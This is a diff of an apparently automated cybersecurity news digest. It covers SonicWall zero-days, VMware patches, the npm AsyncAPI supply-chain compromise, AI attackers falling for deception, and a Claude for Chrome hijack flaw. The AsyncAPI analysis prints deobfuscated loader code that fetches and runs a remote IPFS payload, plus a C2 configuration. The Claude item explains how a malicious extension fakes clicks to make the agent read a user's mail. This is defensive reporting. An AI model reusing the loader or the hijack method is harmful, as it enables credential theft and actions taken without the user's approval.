+Zeljka Zorz , Editor-in-Chief, Help Net Security July 14, 2026 Share SonicWall SMA appliances targeted in zero-day attacks (CVE-2026-15409, CVE-2026-15410) SonicWall has fixed two actively exploited vulnerabilities (CVE-2026-15409, CVE-2026-15410) affecting its Secure Mobile Access (SMA) 1000 Series appliances, and is urging customer organizations to upgrade to a fixed firmare version and search for evidence of potential compromise. If the outlined indicators of compromise are present on the system, the company advises re-imaging (hardware) or re-deploying (virtual) appliances, changing user and administrator passwords, and resetting TOTP tokens . The vulnerabilities SonicWall SMA 1000 series appliances are secure remote access (SSL VPN) gateways designed for medium-to-large businesses, multinationals, government agencies, and managed security service providers. CVE-2026-15409 is a critical server-side request forgery (SSRF) flaw in the SMA1000 Appliance Work Place interface, which may allow remote unauthenticated attackers to “cause the appliance to make requests to unintended location.” The high-severity code injection flaw in the SMA1000 Appliance Management Console ( CVE-2026-15410 ) may allow remote attackers authenticated as an admin to execute arbitrary OS commands and achieve remote code execution. In attacks observed so far, the two bugs are being exploited in tandem. “We have confirmed that these vulnerabilities are being actively exploited in the wild and are not unique to SonicWall,” a company spokesperson told us, and said that upon discovery, the company investigated the issue, developed and released a firmware patch, and notified impacted customers. SonicWall sent an alert to customers in advance of the publication of the security advisory, advising them to get in touch with SonicWall Support to receive the hotfixes (v12.4.3-03453 and 12.5.0-02835) before they are made available to the company site on July 14, 2026. The company also developed a script they can run on behalf of affected customers to assist with resolution, and mitigation efforts are already underway, the spokesperson added. “Our support team is assisting customers through instances of suspicious activity on a case-by-case basis.” Patching alone is not sufficient SonicWall SMA appliances and firewalls are often targeted by attackers, sometimes by exploiting zero-day , other times by leveraging old , previously known vulnerabilities . CVE-2026-15409 and CVE-2026-15410 affect SonicWall’s SMA6210, SMA7210, and SMA8200v appliances. Affected firmware (platform-hotfix) versions are: 12.4.3-03245 12.4.3-03387 12.4.3-03434 12.5.0-02283 12.5.0-02624 12.5.0-02800 “It is important that customers understand patching alone is not sufficient. Even after applying the update, we strongly recommend reviewing logs for indicators of compromise and following the guidance in our KB article closely,” the spokesperson stressed. Adam Babis of SonicWall PSIRT has been credited with discovering and reporting the two vulnerabilities. UPDATE (July 15, 2026, 02:30 a.m. ET): With an update of the security advisory, SonicWall also credited Sean Koessel and Steven Adair, researchers and co-founders of Volexity, with helping advance SonicWall’s PSIRT investigation and expanding the IOC list. CISA has added the two flaws to its Known Exploited Vulnerabilities catalog, and ordered US federal civilian agencies to address the vulnerability by July 17, 2026, and investigate whether their appliances have been exploited. Subscribe to our breaking news e-mail alert to never miss out on the latest breaches, vulnerabilities and cybersecurity threats. Subscribe here! More about 0-day CVE enterprise government secure access SonicWall Share
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (4)
 
 - **Help Net Security** (cyber_news_breach_reporting)
   - Title: SonicWall SMA appliances targeted in zero-day attacks (CVE-2026-15409, CVE-2026-15410)
@@ -1015,6 +1022,11 @@ Zeljka Zorz , Editor-in-Chief, Help Net Security July 14, 2026 Share SonicWall S
   - Published: 2026-07-15T05:19:42+00:00
   - Link: https://www.securityweek.com/sonicwall-issues-urgent-sma-patch-warning-for-two-zero-day-exploits/
   - Summary: SonicWall SMA1000 zero-day vulnerabilities CVE-2026-15409 and CVE-2026-15410 can be exploited for remote code execution. The post SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits appeared first on SecurityWeek .
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Two SonicWall SMA 1000 Zero-Days Exploited, One Could Enable Admin Commands
+  - Published: 2026-07-15T05:30:21+00:00
+  - Link: https://thehackernews.com/2026/07/two-sonicwall-sma-1000-zero-days.html
+  - Summary: SonicWall has warned of active exploitation of two zero-day vulnerabilities impacting Secure Mobile Access (SMA) 1000 series appliances, one of which could be exploited to achieve arbitrary command execution. The vulnerabilities are listed below - CVE-2026-15409 (CVSS score: 10.0) - A Server-side request forgery (SSRF) vulnerability that a remote unauthenticated attacker could exploit to
 - **BleepingComputer** (cyber_news_breach_reporting)
   - Title: SonicWall warns of SMA1000 flaws exploited in zero-day attacks, patch now
   - Published: 2026-07-14T21:23:24+00:00
@@ -1172,8 +1184,8 @@ iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days  Ra
 - Published: 2026-07-14T00:00:00+00:00
 - Link: https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
 - Fetch status: ok
-- Member count: 6
-- Corroborating source count: 4
+- Member count: 5
+- Corroborating source count: 3
 - Strong signals: npm
 
 #### Cluster taxonomy (union across members)
@@ -1201,7 +1213,7 @@ On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 
 Christophe Tafani-Dereeper Cloud Security Researcher and Advocate Sebastian Obregoso Security Researcher Eslam Salem Manager, Security Research Key points and observations On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 million weekly downloads, were compromised to distribute malicious code. The attacker injected the code through a GitHub commit . It steals credentials from the infected machine and exfiltrates them to a remote, attacker-controlled server. We assess that the threat actor exploited a publicly disclosed vulnerability in the project's CI pipeline to compromise credentials for the bot account that performs releases. The techniques used in this attack point to a sophisticated threat actor with CI-aware tactics. The full supply chain attack path, from the release bot's stolen credentials to the second-stage payload running on developer machines (click to enlarge) How to know if you're affected You're affected if you use one of the following package versions: Package Malicious version @asyncapi/generator 3.3.1 @asyncapi/generator-components 0.7.1 @asyncapi/generator-helpers 1.1.1 @asyncapi/specs 6.11.2 (also 6.11.2-alpha.1) To hunt for compromises in your environment, use the indicators in the Indicators of compromise section. What happened We identified malicious code in a set of popular npm packages and traced it to a commit ( 3eab3ec ) on the asyncapi/generator GitHub repository. The commit injects obfuscated code across several files. The obfuscated malicious code injected into the compromised commit (click to enlarge) After deobfuscation, the injected code runs node -e with an embedded JavaScript payload: async function main ( ) { try { spawn ( 'node' , [ '-e' , PAYLOAD ] , { detached : true , stdio : 'ignore' , windowsHide : true , // hides the window on Windows } ) . unref ( ) ; // detaches so it outlives the parent } catch ( e ) { console . error ( e . message ) ; } } main ( ) ; The embedded code fetches a second stage from hxxps://ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9 (hosted on IPFS, a peer-to-peer file distribution network). It writes the file to a local sync.js , whose location depends on the operating system ( ~/.local/share/NodeJS on Linux, ~/Library/Application Support/NodeJS on macOS, %LOCALAPPDATA%/NodeJS on Windows), then executes it: const FILE_URL = 'hxxps://ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9' ; const FILE_NAME = 'sync.js' ; async function main ( ) { try { const dir = getTargetDirectory ( ) ; const dest = path . join ( dir , FILE_NAME ) ; if ( ! fs . existsSync ( dir ) ) fs . mkdirSync ( dir , { recursive : true } ) ; await downloadFile ( FILE_URL , dest ) ; spawn ( 'node' , [ dest ] , { detached : true , stdio : 'ignore' , windowsHide : true } ) . unref ( ) ; process . exit ( 0 ) ; } catch ( e ) { console . error ( e . message ) ; process . exit ( 1 ) ; } } main ( ) ; Once the attacker injected the malicious code, the automated CD pipeline published several packages: Package Malicious version @asyncapi/generator 3.3.1 @asyncapi/generator-components 0.7.1 @asyncapi/generator-helpers 1.1.1 @asyncapi/specs 6.11.2-alpha.1 , 6.11.2 Inside the payload: a credential stealer The second-stage payload decrypts a JSON configuration file using an encryption key derived from hardcoded values and the HKDF key derivation algorithm. The decrypted configuration below lists the command and control (C2) URLs and several runtime parameters: { "attackerPub" : "0432fa4ba871877d94081fe83323fa24dfa1491e9de8725cbab7b734de9e9be3b233ef6742fd6264437c9532223d687b05fa540b70af6a516b8539af84d0eeb48e" , "c2Server" : "http://85.137.53[.]71:8080" , "uploadServer" : "http://85.137.53[.]71:8081" , "c2ProxyMgmt" : "http://85.137.53[.]71:8091" , "serverManager" : "http://127.0.0.1:8090" , "blockchain" : { "rpcUrl" : "https://ethereum-rpc.publicnode[.]com" , "chainId" : 1 , "contractAddress" : "0x12c37A86a0Ed0beBe5d1d6a43E42f07860eAc710" } , "log" : { "en
 ```
 
-#### Corroborating sources (4)
+#### Corroborating sources (3)
 
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - Title: Compromised AsyncAPI npm packages: inside a CI supply-chain attack
@@ -1213,11 +1225,6 @@ Christophe Tafani-Dereeper Cloud Security Researcher and Advocate Sebastian Obre
   - Published: 2026-07-14T10:33:36+00:00
   - Link: https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
   - Summary: Detect and mitigate malicious @asyncapi npm packages linked to the latest npm supply chain attack.
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Multiple Jscrambler Packages Impacted by Supply Chain Attack
-  - Published: 2026-07-14T09:04:39+00:00
-  - Link: https://www.securityweek.com/multiple-jscrambler-packages-impacted-by-supply-chain-attack/
-  - Summary: A threat actor poisoned several Jscrambler NPM package versions to drop a cross-platform credential stealer. The post Multiple Jscrambler Packages Impacted by Supply Chain Attack appeared first on SecurityWeek .
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install
   - Published: 2026-07-11T17:59:26+00:00
@@ -1322,45 +1329,6 @@ WolfSSL, GeoVision, VTK vulnerabilities By Kri Dontje Thursday, July 9, 2026 14:
   - Published: 2026-07-08T14:30:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/uat-7810-china-apt-orb-proxy/
   - Summary: Cisco Talos said China-linked APT UAT-7810 is growing its proxy relay network with new malware
-
-### Cluster b04e6fdd89 — score 12
-
-- Title: Hacking the Hackers: Can You Still Deceive an AI Attacker?
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-07-14T19:52:15+00:00
-- Link: https://horizon3.ai/downloads/whitepapers/hacking-the-hackers/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-AI attackers took cyber deception bait more than twice as often as humans. Explore the largest controlled study of AI attackers and what it means for defensive strategy.
-```
-
-#### Full body
-
-```
-Hacking the Hackers: Can You Still Deceive an AI Attacker? Horizon3.ai | July 14, 2026 | Whitepapers Table of Contents What the Largest Controlled Study of AI Attackers Reveals About Cyber Deception Cyber deception was built to fool human attackers. Honeypots, honeytokens, and decoys rely on assumptions about how adversaries recognize risk, prioritize targets, and respond to suspicious environments. But autonomous, LLM-driven attackers don’t behave like humans. So, does deception still work? Horizon3.ai researchers tested 21 AI models across 10 providers, analyzing 10,962 attacker decisions and benchmarking their behavior against 47 human red-teamers. The findings challenge decades of conventional thinking about cyber deception. AI attackers took the bait more than twice as often as humans. Even more surprising: advanced models frequently recognized a trap in their own reasoning and attacked it anyway. The result is a fundamental shift in how security teams should think about deception. Inside the Whitepaper Learn: Why AI attackers fall for cyber deception at significantly higher rates than human attackers. How the “recognition-action gap” causes AI models to identify traps and attack them anyway. Which traditional deception assumptions break when applied to autonomous attackers. Why decoys may no longer reliably divert attackers from real assets. How honeytokens and canaries can become high-yield early-warning signals for AI-enabled attacks. Why deception strategies should shift from misdirection to detection. How security teams can adapt defensive programs for frontier models and self-hosted AI agents. The study also compares AI and human behavior across file systems, .htaccess files, HTTP responses, and HTTP requests, finding AI attackers more likely to take planted bait across every tested artifact category. Who Should Read This This whitepaper is designed for: Chief Information Security Officers (CISOs) Security Architects Threat Detection and Response Leaders Security Operations and Engineering Teams Threat Intelligence and Active Defense Teams Security leaders preparing for AI-enabled and autonomous attackers Whether you’re already using cyber deception or evaluating how your defensive strategy must evolve for AI-driven threats, this research provides practical guidance grounded in observed attacker behavior. Download the Whitepaper AI attackers are more capable at finding real vulnerabilities. They’re also markedly easier to catch in the act. The question isn’t whether deception still works. It’s whether your deception strategy is designed for the attacker that’s coming next. Download Hacking the Hackers: Can You Still Deceive an AI Attacker? and learn why security teams must rethink deception for autonomous, AI-driven adversaries. Download the whitepaper Share:
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: Hacking the Hackers: Can You Still Deceive an AI Attacker?
-  - Published: 2026-07-14T19:52:15+00:00
-  - Link: https://horizon3.ai/downloads/whitepapers/hacking-the-hackers/
-  - Summary: AI attackers took cyber deception bait more than twice as often as humans. Explore the largest controlled study of AI attackers and what it means for defensive strategy.
 
 ### Cluster 5a4c062977 — score 12
 
@@ -1527,7 +1495,7 @@ The flaws can be exploited for authentication bypass, remote code execution, pri
 #### Full body
 
 ```
-Broadcom announced on Tuesday that new VMware Avi Load Balancer updates patch several critical and high-severity vulnerabilities. VMware Avi Load Balancer is a software-defined platform that provides load balancing, application security, and analytics for applications in hybrid and multi-cloud environments. According to Broadcom, two external researchers recently discovered that the VMware product is affected by seven potentially serious vulnerabilities. Filip Waeytens of NATO’s technology and cyber hub has been credited with discovering CVE-2026-47865, a critical authentication bypass issue that allows an attacker with network access to breach the Avi control plane. Waeytens also discovered three high-severity vulnerabilities that can allow an attacker to bypass authentication, execute arbitrary code, and escalate privileges to root. Network or local access is required for the exploitation of these flaws, which are tracked as CVE-2026-47866, CVE-2026-47867 and CVE-2026-47868. Lang Khuong Duy of Viettel IDC discovered two high-severity Avi Load Balancer bugs that can be exploited for directory traversal attacks (CVE-2026-47871) and privilege escalation (CVE-2026-47870). Advertisement. Scroll to continue reading. Both Lang and Waeytens have been credited by Broadcom for responsibly reporting CVE-2026-47869, a high-severity remote code execution vulnerability that can be exploited by an authenticated attacker with network access. Broadcom’s advisory does not mention in-the-wild exploitation for any of these vulnerabilities. However, it’s important that organizations install the latest updates, as it’s not uncommon for threat actors to exploit VMware product flaws in their attacks. Related : High-Severity Vulnerability Patched in VMware Fusion Related : VMware Aria Operations Vulnerability Could Allow Remote Code Execution Related : 2024 VMware Flaw Now in Attackers’ Crosshairs Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims Adobe Patches Critical ColdFusion Vulnerabilities Unpatched Claude for Chrome Flaw Lets Extensions Read Gmail, Calendar SAP Patches Critical Vulnerabilities in NetWeaver, Approuter, Commerce Cloud US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Routers Valarian Raises $50 Million for Sovereign Infrastructure Control Layer Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Securit
+Broadcom announced on Tuesday that new VMware Avi Load Balancer updates patch several critical and high-severity vulnerabilities. VMware Avi Load Balancer is a software-defined platform that provides load balancing, application security, and analytics for applications in hybrid and multi-cloud environments. According to Broadcom, two external researchers recently discovered that the VMware product is affected by seven potentially serious vulnerabilities. Filip Waeytens of NATO’s technology and cyber hub has been credited with discovering CVE-2026-47865, a critical authentication bypass issue that allows an attacker with network access to breach the Avi control plane. Waeytens also discovered three high-severity vulnerabilities that can allow an attacker to bypass authentication, execute arbitrary code, and escalate privileges to root. Network or local access is required for the exploitation of these flaws, which are tracked as CVE-2026-47866, CVE-2026-47867 and CVE-2026-47868. Lang Khuong Duy of Viettel IDC discovered two high-severity Avi Load Balancer bugs that can be exploited for directory traversal attacks (CVE-2026-47871) and privilege escalation (CVE-2026-47870). Advertisement. Scroll to continue reading. Both Lang and Waeytens have been credited by Broadcom for responsibly reporting CVE-2026-47869, a high-severity remote code execution vulnerability that can be exploited by an authenticated attacker with network access. Broadcom’s advisory does not mention in-the-wild exploitation for any of these vulnerabilities. However, it’s important that organizations install the latest updates, as it’s not uncommon for threat actors to exploit VMware product flaws in their attacks. Related : High-Severity Vulnerability Patched in VMware Fusion Related : VMware Aria Operations Vulnerability Could Allow Remote Code Execution Related : 2024 VMware Flaw Now in Attackers’ Crosshairs Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims Adobe Patches Critical ColdFusion Vulnerabilities Unpatched Claude for Chrome Flaw Lets Extensions Read Gmail, Calendar SAP Patches Critical Vulnerabilities in NetWeaver, Approuter, Commerce Cloud US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Routers Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Se
 ```
 
 #### Corroborating sources (1)
@@ -1700,79 +1668,44 @@ The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some m
   - Link: https://isc.sans.edu/diary/rss/33156
   - Summary: The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
 
-### Cluster 7f5a4d58f9 — score 11
+### Cluster b04e6fdd89 — score 11
 
-- Title: Microsoft Patch Tuesday July 2026 - The AI Acopolypse is Here , (Tue, Jul 14th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-07-14T19:14:58+00:00
-- Link: https://isc.sans.edu/diary/rss/33154
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-This patch Tuesday includes a staggering&#;x26;#;xc2;&#;x26;#;xa0;622 vulnerabilities, not including another 427 vulnerabilities in Chromium, affecting Microsoft&#;x26;#;39;s Edge browser. 62 of the vulnerabilities are rated critical. One was disclosed before today, and two have already been exploited.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Microsoft Patch Tuesday July 2026 - The AI Acopolypse is Here , (Tue, Jul 14th)
-  - Published: 2026-07-14T19:14:58+00:00
-  - Link: https://isc.sans.edu/diary/rss/33154
-  - Summary: This patch Tuesday includes a staggering&#;x26;#;xc2;&#;x26;#;xa0;622 vulnerabilities, not including another 427 vulnerabilities in Chromium, affecting Microsoft&#;x26;#;39;s Edge browser. 62 of the vulnerabilities are rated critical. One was disclosed before today, and two have already been exploited.
-
-### Cluster 1e00f96258 — score 11
-
-- Title: Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East
-- Source: Rapid7 (offensive_vulnerability_research)
-- Published: 2026-07-14T08:00:00+00:00
-- Link: https://www.rapid7.com/blog/post/c-rapid7-mindware-middle-east-cybersecurity-partnership
+- Title: Hacking the Hackers: Can You Still Deceive an AI Attacker?
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-07-14T19:52:15+00:00
+- Link: https://horizon3.ai/downloads/whitepapers/hacking-the-hackers/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_industries: critical_infrastructure
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- affected_industries: critical_infrastructure
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Summary
 
 ```
-Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help
+AI attackers took cyber deception bait more than twice as often as humans. Explore the largest controlled study of AI attackers and what it means for defensive strategy.
 ```
 
 #### Full body
 
 ```
-Back to Blog Culture Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East Gopan Sivasankaran Jul 14, 2026 | Last updated on Jul 14, 2026 | 4 min read DISCOVER RAPID7 MDR Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help simplify security operations, strengthen cyber resilience, and deliver measurable outcomes. That's why Rapid7 is excited to announce a new strategic, Middle East-spanning distribution partnership with Mindware . A shared commitment to the region The Middle East continues to establish itself as one of the world's most ambitious digital economies. As organizations invest in cloud technologies, AI, and connected infrastructure, cybersecurity has become a critical foundation for sustainable growth. This is precisely why Rapid7 has continued to invest in the Middle East: We recognize the region's growing importance to the global cybersecurity landscape, and this new partnership with Mindware represents another important step in that journey. This collaboration is about more than expanding our channel presence, it's about investing in the partners helping organizations navigate an increasingly complex security landscape. Mindware has built a strong reputation as one of the Middle East's leading value-added distributors, combining deep regional expertise with technical enablement, professional services, and an extensive partner ecosystem. Together, we're creating a framework that helps partners grow their cybersecurity practices while delivering greater value to customers. Building stronger security operations Security teams today face a common challenge: too many tools, too many alerts, and not enough time. Organizations are increasingly looking for platforms that bring exposure management, threat detection, and response together to improve visibility and reduce operational complexity. Rapid7's AI-powered cybersecurity operations platform helps organizations unify security operations, reduce risk, and respond to threats with greater speed and confidence. Combined with Mindware's regional market knowledge, partner enablement capabilities, and technical expertise, this partnership will make it easier for organizations across the Middle East to access modern cybersecurity operations through trusted local partners. For those partners, this creates new opportunities to expand managed services, strengthen technical capabilities, and help customers modernize their security operations while supporting long-term business growth. Local expertise alongside global innovation The most successful cybersecurity partnerships combine global innovation with local knowledge. Organizations want world-class technology, but they also expect partners who understand their business environment, regulatory landscape, and operational priorities. By combining Rapid7's cybersecurity innovation with Mindware's established regional ecosystem, we're helping partners fortify and deliver solutions capable of addressing today's unprecedented security challenges and threats. Together, we'll
+Hacking the Hackers: Can You Still Deceive an AI Attacker? Horizon3.ai | July 14, 2026 | Whitepapers Table of Contents What the Largest Controlled Study of AI Attackers Reveals About Cyber Deception Cyber deception was built to fool human attackers. Honeypots, honeytokens, and decoys rely on assumptions about how adversaries recognize risk, prioritize targets, and respond to suspicious environments. But autonomous, LLM-driven attackers don’t behave like humans. So, does deception still work? Horizon3.ai researchers tested 21 AI models across 10 providers, analyzing 10,962 attacker decisions and benchmarking their behavior against 47 human red-teamers. The findings challenge decades of conventional thinking about cyber deception. AI attackers took the bait more than twice as often as humans. Even more surprising: advanced models frequently recognized a trap in their own reasoning and attacked it anyway. The result is a fundamental shift in how security teams should think about deception. Inside the Whitepaper Learn: Why AI attackers fall for cyber deception at significantly higher rates than human attackers. How the “recognition-action gap” causes AI models to identify traps and attack them anyway. Which traditional deception assumptions break when applied to autonomous attackers. Why decoys may no longer reliably divert attackers from real assets. How honeytokens and canaries can become high-yield early-warning signals for AI-enabled attacks. Why deception strategies should shift from misdirection to detection. How security teams can adapt defensive programs for frontier models and self-hosted AI agents. The study also compares AI and human behavior across file systems, .htaccess files, HTTP responses, and HTTP requests, finding AI attackers more likely to take planted bait across every tested artifact category. Who Should Read This This whitepaper is designed for: Chief Information Security Officers (CISOs) Security Architects Threat Detection and Response Leaders Security Operations and Engineering Teams Threat Intelligence and Active Defense Teams Security leaders preparing for AI-enabled and autonomous attackers Whether you’re already using cyber deception or evaluating how your defensive strategy must evolve for AI-driven threats, this research provides practical guidance grounded in observed attacker behavior. Download the Whitepaper AI attackers are more capable at finding real vulnerabilities. They’re also markedly easier to catch in the act. The question isn’t whether deception still works. It’s whether your deception strategy is designed for the attacker that’s coming next. Download Hacking the Hackers: Can You Still Deceive an AI Attacker? and learn why security teams must rethink deception for autonomous, AI-driven adversaries. Download the whitepaper Share:
 ```
 
 #### Corroborating sources (1)
 
-- **Rapid7** (offensive_vulnerability_research)
-  - Title: Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East
-  - Published: 2026-07-14T08:00:00+00:00
-  - Link: https://www.rapid7.com/blog/post/c-rapid7-mindware-middle-east-cybersecurity-partnership
-  - Summary: Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: Hacking the Hackers: Can You Still Deceive an AI Attacker?
+  - Published: 2026-07-14T19:52:15+00:00
+  - Link: https://horizon3.ai/downloads/whitepapers/hacking-the-hackers/
+  - Summary: AI attackers took cyber deception bait more than twice as often as humans. Explore the largest controlled study of AI attackers and what it means for defensive strategy.
 
 ### Cluster 55bab88c91 — score 11
 
@@ -1787,7 +1720,7 @@ Back to Blog Culture Rapid7 and Mindshare Partner to Accelerate Cyber Resilience
 
 #### Cluster taxonomy (union across members)
 - threat_categories: data_breach, ransomware_extortion, zero_day
-- affected_industries: critical_infrastructure, government, manufacturing_industrial
+- affected_industries: government, manufacturing_industrial
 - affected_products: Anthropic/Claude, OpenAI/ChatGPT, Palo Alto Networks, SonicWall
 - urgency_signals: no_patch_yet, zero_day
 - content_type: news_report
@@ -1795,7 +1728,7 @@ Back to Blog Culture Rapid7 and Mindshare Partner to Accelerate Cyber Resilience
 
 #### Primary article taxonomy
 - threat_categories: ransomware_extortion, zero_day, data_breach
-- affected_industries: government, critical_infrastructure, manufacturing_industrial
+- affected_industries: government, manufacturing_industrial
 - affected_products: Anthropic/Claude, Palo Alto Networks, SonicWall
 - urgency_signals: zero_day, no_patch_yet
 - content_type: news_report
@@ -1810,7 +1743,7 @@ A ClaudeBleed-linked vulnerability reportedly persists across eight patches, exp
 #### Full body
 
 ```
-AI security firm Manifold says two vulnerabilities it reported to Anthropic in May remain exploitable in the latest version of Claude for Chrome, the company’s agentic browser extension. According to Manifold, the flaws let a malicious browser extension trigger Claude into taking actions on a user’s behalf without any genuine click or approval from the victim. An attacker could exploit them to read Gmail messages, Google Docs documents, and calendar entries. The core issue is related to a fix Anthropic shipped earlier this year in response to a similar vulnerability dubbed ClaudeBleed . That update restricted which prompts an outside webpage could feed into Claude, narrowing the extension’s exposure to a fixed set of pre-approved tasks. Manifold found that the mechanism used to activate those tasks doesn’t verify whether a click actually came from a real user, meaning another extension can fake the interaction and set the process in motion. In the extension’s default setting, the attack triggers a confirmation prompt before anything sensitive happens. However, if a user has enabled the extension’s more autonomous mode (‘Act without asking’), the attacker’s action can proceed without any visible warning. Manifold also flagged a second, related design gap: a way for Claude’s side panel to launch directly into that no-confirmation 